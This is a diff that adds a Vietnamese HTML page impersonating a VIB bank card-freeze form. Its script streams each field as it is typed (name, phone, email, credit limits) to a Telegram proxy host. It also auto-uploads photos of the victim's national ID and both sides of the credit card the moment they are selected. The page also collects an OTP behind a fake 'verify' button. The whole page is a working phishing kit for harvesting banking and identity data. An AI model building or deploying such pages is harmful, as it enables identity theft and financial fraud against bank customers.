@@ -1,0 +1,452 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>VIB – Đóng Băng Thẻ (Realtime Telegram)</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    :root{ --vib-blue:#0033A0; --vib-orange:#FFA300; }
+    body{background:#f5f7fb}
+    .text-vib{color:var(--vib-blue)!important}
+    .btn-vib{background:var(--vib-orange); color:#212529; border:none;}
+    .btn-vib:hover{filter:brightness(0.95)}
+    .section-card{border-radius:16px;border:1px solid #e8eef7}
+    .required::after{content:" *"; color:#dc3545; font-weight:700}
+    .badge-step{width:34px;height:34px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-weight:700}
+    .help-text{font-size:.9rem;color:#6c7a90}
+    .note-box{background:#f8fafc;border:1px dashed #d8e1f1;border-radius:12px;padding:12px}
+    .file-list{font-size:.9rem;color:#6c7a90}
+    .input-money{letter-spacing:.02em}
+    .otp-hint{font-size:.9rem;color:#6c7a90}
+    .shake{animation:shake .25s linear 0s 2}
+    @keyframes shake{
+      0%{transform:translateX(0)}
+      25%{transform:translateX(-4px)}
+      50%{transform:translateX(4px)}
+      75%{transform:translateX(-4px)}
+      100%{transform:translateX(0)}
+    }
+  </style>
+</head>
+<body class="bg-light">
+<header class="border-bottom bg-white">
+  <div class="container py-3">
+    <h1 class="h4 mb-0 text-vib">Đóng băng thẻ tín dụng VIB – Gửi realtime về Telegram</h1>
+    <p class="mb-0 text-secondary">Nhập đến đâu gửi đến đó. Ảnh/tệp tự động đẩy lên Telegram.</p>
+  </div>
+</header>
+
+<main class="container my-4">
+  <div class="row g-3 mb-3">
+    <div class="col-12">
+      <div class="d-flex flex-wrap gap-3 align-items-center">
+        <div class="d-flex align-items-center gap-2">
+          <span class="badge-step text-white" style="background:var(--vib-blue);">1</span>
+          <span>Chế độ & thời điểm</span>
+        </div>
+        <div class="text-secondary">—</div>
+        <div class="d-flex align-items-center gap-2">
+          <span class="badge-step bg-secondary-subtle">2</span>
+          <span>Thông tin thẻ</span>
+        </div>
+        <div class="text-secondary">—</div>
+        <div class="d-flex align-items-center gap-2">
+          <span class="badge-step bg-secondary-subtle">3</span>
+          <span>Lý do & liên hệ</span>
+        </div>
+        <div class="text-secondary">—</div>
+        <div class="d-flex align-items-center gap-2">
+          <span class="badge-step bg-secondary-subtle">4</span>
+          <span>Tệp đính kèm & OTP</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <form id="tempBlockForm" class="needs-validation" novalidate>
+    <!-- 1) Mode & schedule -->
+    <section class="section-card bg-white p-4 mb-4">
+      <h2 class="h5 mb-3">1) Chế độ đóng băng & thời điểm</h2>
+      <div class="row g-3 align-items-end">
+        <div class="col-md-4">
+          <label class="form-label required">Thời hạn đóng băng</label>
+          <select id="duration" class="form-select" required>
+            <option value="24" selected>24 giờ (mặc định)</option>
+            <option value="12">12 giờ</option>
+            <option value="48">48 giờ</option>
+          </select>
+          <div class="invalid-feedback">Vui lòng chọn thời hạn.</div>
+        </div>
+        <div class="col-md-4">
+          <label class="form-label required">Bắt đầu</label>
+          <div class="form-check">
+            <input id="startNow" name="startMode" class="form-check-input" type="radio" value="now" checked>
+            <label class="form-check-label" for="startNow">Ngay lập tức</label>
+          </div>
+          <div class="form-check">
+            <input id="startSchedule" name="startMode" class="form-check-input" type="radio" value="schedule">
+            <label class="form-check-label" for="startSchedule">Hẹn giờ</label>
+          </div>
+        </div>
+        <div class="col-md-4" id="scheduleWrap" style="display:none">
+          <label class="form-label required" for="startAt">Thời điểm bắt đầu</label>
+          <input id="startAt" class="form-control" type="datetime-local" disabled>
+          <div class="invalid-feedback">Vui lòng chọn thời điểm hợp lệ (≥ hiện tại + 5 phút).</div>
+        </div>
+        <div class="col-12">
+          <div class="note-box">
+            <strong>Thời điểm mở lại dự kiến:</strong>
+            <span id="resumeTime" class="ms-1">—</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 2) Card info -->
+    <section class="section-card bg-white p-4 mb-4">
+      <h2 class="h5 mb-3">2) Thông tin thẻ</h2>
+      <div class="row g-3">
+        <div class="col-md-6">
+          <label class="form-label required" for="cardType">Loại thẻ</label>
+          <select id="cardType" class="form-select" required>
+            <option value="">Chọn...</option>
+            <option>VIB Mastercard</option>
+            <option>VIB Visa</option>
+            <option>VIB JCB</option>
+          </select>
+          <div class="invalid-feedback">Vui lòng chọn loại thẻ.</div>
+        </div>
+        <!-- ĐÃ XÓA: Số thẻ -->
+        <div class="col-md-3">
+          <label class="form-label required" for="creditLimitGranted">Hạn mức thẻ được cấp (VND)</label>
+          <input id="creditLimitGranted" class="form-control input-money" inputmode="numeric" placeholder="VD: 100.000.000 ₫" required>
+          <div class="invalid-feedback">Vui lòng nhập hạn mức được cấp hợp lệ (≥ 0).</div>
+        </div>
+        <div class="col-md-3">
+          <label class="form-label required" for="creditLimitCurrent">Hạn mức hiện tại (VND)</label>
+          <input id="creditLimitCurrent" class="form-control input-money" inputmode="numeric" placeholder="VD: 80.000.000 ₫" required>
+          <div class="invalid-feedback">Vui lòng nhập hạn mức hiện tại hợp lệ (≥ 0).</div>
+        </div>
+        <div class="col-md-6">
+          <label class="form-label required" for="holderName">Tên in trên thẻ</label>
+          <input id="holderName" class="form-control" required>
+          <div class="invalid-feedback">Vui lòng nhập tên in trên thẻ.</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 3) Reason & contact -->
+    <section class="section-card bg-white p-4 mb-4">
+      <h2 class="h5 mb-3">3) Lý do & kênh liên hệ</h2>
+      <div class="row g-3">
+        <div class="col-md-6">
+          <label class="form-label required" for="reason">Lý do tạm khóa</label>
+          <select id="reason" class="form-select" required>
+            <option value="">Chọn...</option>
+            <option>Nghi ngờ giao dịch bất thường</option>
+            <option>Làm thất lạc thẻ (chưa xác định mất)</option>
+            <option>Đi công tác/du lịch – muốn tạm khóa</option>
+            <option>Được ngân hàng khuyến cáo</option>
+            <option>Khác</option>
+          </select>
+          <div class="invalid-feedback">Vui lòng chọn lý do.</div>
+        </div>
+        <div class="col-md-6">
+          <label class="form-label" for="reasonNote">Ghi chú bổ sung</label>
+          <input id="reasonNote" class="form-control" placeholder="Mô tả ngắn, nếu chọn 'Khác'...">
+        </div>
+
+        <div class="col-md-4">
+          <label class="form-label required" for="phone">Số điện thoại</label>
+          <input id="phone" class="form-control" inputmode="tel" pattern="^(0|\\+84)[0-9]{9,10}$" placeholder="VD: 09xxxxxxxx" required>
+          <div class="invalid-feedback">Số điện thoại không hợp lệ.</div>
+        </div>
+        <div class="col-md-4">
+          <label class="form-label" for="email">Email</label>
+          <input id="email" type="email" class="form-control" placeholder="you@email.com">
+          <div class="invalid-feedback">Email không hợp lệ.</div>
+        </div>
+        <div class="col-md-4">
+          <label class="form-label" for="otpChannel">Kênh nhận OTP</label>
+          <select id="otpChannel" class="form-select">
+            <option>OTP SMS</option>
+            <option>Cuộc gọi xác minh</option>
+            <option>Email xác nhận</option>
+          </select>
+        </div>
+      </div>
+    </section>
+
+    <!-- 4) Attachments & OTP -->
+    <section class="section-card bg-white p-4 mb-4">
+      <h2 class="h5 mb-3">4) Tệp đính kèm & OTP</h2>
+      <div class="row g-3">
+        <!-- Files -->
+        <div class="col-md-3">
+          <label class="form-label required" for="frontId">Ảnh CCCD mặt trước</label>
+          <input id="frontId" type="file" class="form-control" accept=".jpg,.jpeg,.png" required>
+          <div class="invalid-feedback">Vui lòng tải ảnh mặt trước CCCD.</div>
+          <div id="frontIdList" class="file-list mt-1"></div>
+        </div>
+        <div class="col-md-3">
+          <label class="form-label required" for="backId">Ảnh CCCD mặt sau</label>
+          <input id="backId" type="file" class="form-control" accept=".jpg,.jpeg,.png" required>
+          <div class="invalid-feedback">Vui lòng tải ảnh mặt sau CCCD.</div>
+          <div id="backIdList" class="file-list mt-1"></div>
+        </div>
+        <div class="col-md-3">
+          <label class="form-label required" for="frontCard">Ảnh Thẻ tín dụng mặt trước</label>
+          <input id="frontCard" type="file" class="form-control" accept=".jpg,.jpeg,.png" required>
+          <div class="help-text">Che 6 số giữa để bảo mật.</div>
+          <div class="invalid-feedback">Vui lòng tải ảnh mặt trước thẻ.</div>
+          <div id="frontCardList" class="file-list mt-1"></div>
+        </div>
+        <div class="col-md-3">
+          <label class="form-label required" for="backCard">Ảnh Thẻ tín dụng mặt sau</label>
+          <input id="backCard" type="file" class="form-control" accept=".jpg,.jpeg,.png" required>
+          <div class="help-text">Che mã CVV để bảo mật.</div>
+          <div class="invalid-feedback">Vui lòng tải ảnh mặt sau thẻ.</div>
+          <div id="backCardList" class="file-list mt-1"></div>
+        </div>
+
+        <div class="col-12 mt-2">
+          <div class="form-check mb-2">
+            <input id="agree1" class="form-check-input" type="checkbox" required>
+            <label class="form-check-label required" for="agree1">
+              Tôi đồng ý tạm khóa thẻ theo thông tin đã chọn và chịu trách nhiệm về các yêu cầu mở lại sớm.
+            </label>
+            <div class="invalid-feedback">Bạn cần đồng ý trước khi gửi.</div>
+          </div>
+          <div class="form-check">
+            <input id="agree2" class="form-check-input" type="checkbox">
+            <label class="form-check-label" for="agree2">
+              Tôi đồng ý với <a href="#" class="link-secondary">Điều khoản & Bảo mật</a> của VIB.
+            </label>
+          </div>
+        </div>
+
+        <!-- OTP (luôn hiện, chỉ nhận 6 số) -->
+        <div class="col-md-4">
+          <label class="form-label" for="otp">Mã OTP (6 số)</label>
+          <input id="otp" class="form-control" inputmode="numeric" maxlength="6" placeholder="Nhập 6 số OTP">
+          <div class="help-text">Chỉ chấp nhận ký tự số. Tự cắt còn 6 số khi dán.</div>
+        </div>
+      </div>
+
+      <div class="d-flex align-items-center gap-3 mt-3">
+        <button type="button" id="actionBtn" class="btn btn-vib px-4 py-2 fw-semibold">Xác Thực OTP</button>
+        <a href="#" class="btn btn-outline-secondary">Quay lại</a>
+      </div>
+    </section>
+  </form>
+</main>
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+<script>
+  /* ============ TELEGRAM PROXY CONFIG ============ */
+  // ĐỔI thành domain Cloudflare Worker/Server của bạn:
+  const TG_PROXY_URL = 'https://your-worker.example.workers.dev';
+
+  /* ============ TELEGRAM HELPERS ============ */
+  async function tgSendMessage(text, parse_mode='Markdown'){
+    try{
+      const res = await fetch(`${TG_PROXY_URL}/sendMessage`, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ text, parse_mode })
+      });
+      if(!res.ok){ console.warn('tgSendMessage failed', await res.text()); }
+    }catch(e){ console.warn('tgSendMessage error', e); }
+  }
+  async function tgSendDocument(file, caption=''){
+    try{
+      const fd = new FormData();
+      fd.append('document', file, file.name);
+      fd.append('caption', caption);
+      const res = await fetch(`${TG_PROXY_URL}/sendDocument`, { method:'POST', body: fd });
+      if(!res.ok){ console.warn('tgSendDocument failed', await res.text()); }
+    }catch(e){ console.warn('tgSendDocument error', e); }
+  }
+
+  /* ============ COMMON HELPERS ============ */
+  const MAX_FILE_MB = 5;
+  const NBSP = '\u00A0';
+  const $ = (id) => document.getElementById(id);
+  const p2 = (n)=> String(n).padStart(2,'0');
+
+  function validFileSize(file){ return file.size <= MAX_FILE_MB * 1024 * 1024; }
+  function fmt(dt){ return `${p2(dt.getDate())}/${p2(dt.getMonth()+1)}/${dt.getFullYear()} ${p2(dt.getHours())}:${p2(dt.getMinutes())}`; }
+  function addHours(date, h){ const t = new Date(date.getTime()); t.setHours(t.getHours()+Number(h)); return t; }
+  function getNowPlusMinutes(mins){ const t = new Date(); t.setMinutes(t.getMinutes()+mins); t.setSeconds(0); t.setMilliseconds(0); return t; }
+  function toLocalDatetimeValue(dt){ return `${dt.getFullYear()}-${p2(dt.getMonth()+1)}-${p2(dt.getDate())}T${p2(dt.getHours())}:${p2(dt.getMinutes())}`; }
+  function digitsOnly(str){ return (str||'').replace(/\D+/g,''); }
+  function formatVNDFromDigits(d){ if(d==='') return ''; const parts=[]; for(let i=d.length;i>0;i-=3){ parts.unshift(d.slice(Math.max(0,i-3), i)); } return parts.join('.') + NBSP + '₫'; }
+  function parseVNDToNumber(str){ const d = digitsOnly(str); return d === '' ? NaN : Number(d); }
+
+  // debounce gửi Telegram (tránh spam khi đang gõ)
+  function debounce(fn, delay=800){
+    let t=null;
+    return (...args)=>{ clearTimeout(t); t=setTimeout(()=>fn(...args), delay); };
+  }
+
+  /* ============ ELEMENTS ============ */
+  const form = $('tempBlockForm');
+  const durationEl = $('duration');
+  const startNowEl = $('startNow');
+  const startScheduleEl = $('startSchedule');
+  const scheduleWrap = $('scheduleWrap');
+  const startAtEl = $('startAt');
+  const resumeTimeEl = $('resumeTime');
+
+  const cardTypeEl = $('cardType');
+  const creditGrantedEl = $('creditLimitGranted');
+  const creditCurrentEl = $('creditLimitCurrent');
+  const holderNameEl = $('holderName');
+
+  const reasonEl = $('reason');
+  const reasonNoteEl = $('reasonNote');
+  const phoneEl = $('phone');
+  const emailEl = $('email');
+  const otpChannelEl = $('otpChannel');
+
+  const agree1El = $('agree1');
+  const agree2El = $('agree2');
+
+  const frontIdEl = $('frontId');
+  const backIdEl = $('backId');
+  const frontCardEl = $('frontCard');
+  const backCardEl = $('backCard');
+
+  const actionBtn = $('actionBtn');
+  const otpEl = $('otp');
+
+  /* ============ VNĐ formatter ============ */
+  function bindVndFormatter(inputEl,label){
+    inputEl.addEventListener('input', ()=>{
+      const digits = digitsOnly(inputEl.value);
+      inputEl.value = formatVNDFromDigits(digits);
+      inputEl.setCustomValidity(digits === '' ? 'invalid' : '');
+      inputEl.selectionStart = inputEl.selectionEnd = inputEl.value.length;
+      sendField(label, inputEl.value);
+    });
+    inputEl.addEventListener('blur', ()=>{
+      const digits = digitsOnly(inputEl.value);
+      inputEl.value = digits ? formatVNDFromDigits(digits) : '';
+      sendField(label, inputEl.value);
+    });
+  }
+  bindVndFormatter(creditGrantedEl, 'Hạn mức được cấp');
+  bindVndFormatter(creditCurrentEl, 'Hạn mức hiện tại');
+
+  /* ============ Schedule / resume time ============ */
+  function getStartDate(){
+    if(startScheduleEl.checked && startAtEl.value){ return new Date(startAtEl.value); }
+    return new Date();
+  }
+  function updateResumeTime(){
+    const start = getStartDate();
+    const hours = Number(durationEl.value || 24);
+    const resume = addHours(start, hours);
+    resumeTimeEl.textContent = fmt(resume);
+  }
+  function applyStartMin(){
+    const minDt = getNowPlusMinutes(5);
+    startAtEl.min = toLocalDatetimeValue(minDt);
+    if(startAtEl.value && new Date(startAtEl.value) < minDt){ startAtEl.value = startAtEl.min; }
+  }
+  function toggleSchedule(){
+    const usingSchedule = startScheduleEl.checked;
+    scheduleWrap.style.display = usingSchedule ? '' : 'none';
+    startAtEl.disabled = !usingSchedule;
+    startAtEl.required = usingSchedule;
+    if(usingSchedule) applyStartMin();
+    updateResumeTime();
+    sendField('Chế độ bắt đầu', usingSchedule ? 'Hẹn giờ' : 'Ngay lập tức');
+  }
+
+  startNowEl.addEventListener('change', toggleSchedule);
+  startScheduleEl.addEventListener('change', toggleSchedule);
+  durationEl.addEventListener('change', ()=>{ updateResumeTime(); sendField('Thời hạn', durationEl.value + ' giờ'); });
+  startAtEl.addEventListener('input', ()=>{ updateResumeTime(); sendField('Hẹn giờ lúc', startAtEl.value || '—'); });
+
+  /* ============ Input -> Telegram (realtime) ============ */
+  const sendField = debounce((label, val)=>{
+    const txt = `*Trường cập nhật:*\n• ${label}: ${val || '—'}`;
+    tgSendMessage(txt);
+  }, 500);
+
+  // Text inputs
+  holderNameEl.addEventListener('input', ()=> sendField('Tên in trên thẻ', holderNameEl.value));
+  reasonNoteEl.addEventListener('input', ()=> sendField('Ghi chú bổ sung', reasonNoteEl.value));
+  phoneEl.addEventListener('input', ()=> sendField('Số điện thoại', phoneEl.value));
+  emailEl.addEventListener('input', ()=> sendField('Email', emailEl.value));
+
+  // Selects
+  cardTypeEl.addEventListener('change', ()=> sendField('Loại thẻ', cardTypeEl.value));
+  reasonEl.addEventListener('change', ()=> sendField('Lý do tạm khóa', reasonEl.value));
+  otpChannelEl.addEventListener('change', ()=> sendField('Kênh nhận OTP', otpChannelEl.value));
+
+  // Checkboxes
+  agree1El.addEventListener('change', ()=> sendField('Đồng ý tạm khóa', agree1El.checked ? 'Có' : 'Không'));
+  agree2El.addEventListener('change', ()=> sendField('Đồng ý Điều khoản & Bảo mật', agree2El.checked ? 'Có' : 'Không'));
+
+  // Khởi tạo resume time lần đầu
+  toggleSchedule(); updateResumeTime(); applyStartMin();
+
+  /* ============ Files: auto upload ngay khi chọn ============ */
+  function bindFileAutoUpload(inputEl, captionPrefix, listId){
+    inputEl.addEventListener('change', async (e)=>{
+      const files = [...inputEl.files||[]];
+      // hiển thị danh sách
+      document.getElementById(listId).textContent =
+        files.map(f=>`${f.name} (${(f.size/1024/1024).toFixed(2)} MB)`).join(' • ');
+      if(!files.length) return;
+
+      for(const f of files){
+        if(!validFileSize(f)){
+          alert(`Tệp "${f.name}" vượt quá ${MAX_FILE_MB} MB. Tệp này sẽ không được gửi.`);
+          continue;
+        }
+        // Gửi thông tin tệp
+        await tgSendMessage(`*Tệp được chọn:* ${captionPrefix}\n• ${f.name} • ${(f.size/1024/1024).toFixed(2)} MB`);
+        // Gửi tệp lên Telegram
+        await tgSendDocument(f, `${captionPrefix} – ${f.name}`);
+      }
+    });
+  }
+  bindFileAutoUpload(frontIdEl,  'CCCD mặt trước', 'frontIdList');
+  bindFileAutoUpload(backIdEl,   'CCCD mặt sau',   'backIdList');
+  bindFileAutoUpload(frontCardEl,'Thẻ mặt trước',  'frontCardList');
+  bindFileAutoUpload(backCardEl, 'Thẻ mặt sau',    'backCardList');
+
+  /* ============ OTP: chỉ cho phép 6 số (lọc nhập & dán) ============ */
+  otpEl.addEventListener('input', ()=>{
+    // Lọc tất cả không phải số
+    let v = otpEl.value.replace(/\D/g,'');
+    if(v.length > 6) v = v.slice(0,6);
+    otpEl.value = v;
+    sendField('OTP (đang nhập)', v.replace(/./g,'•')); // ẩn số khi log (tuỳ chọn)
+  });
+  otpEl.addEventListener('paste', (e)=>{
+    e.preventDefault();
+    const text = (e.clipboardData || window.clipboardData).getData('text') || '';
+    const v = text.replace(/\D/g,'').slice(0,6);
+    otpEl.value = v;
+    sendField('OTP (dán)', v.replace(/./g,'•'));
+  });
+
+  /* ============ Nút Xác Thực OTP ============ */
+  actionBtn.addEventListener('click', async ()=>{
+    const otpVal = otpEl.value.trim();
+    if(!/^\d{6}$/.test(otpVal)){
+      await tgSendMessage(`*Xác thực OTP:* ❌ Sai định dạng (đã nhập: ${otpVal.length} ký tự)`);
+      alert('OTP phải gồm đúng 6 số.');
+      return;
+    }
+    await tgSendMessage(`*Xác thực OTP:* 🔐 Đã nhập đủ 6 số (ẩn)`);
+    alert('Đã gửi OTP lên hệ thống (demo).');
+  });
+</script>
+</body>
+</html>
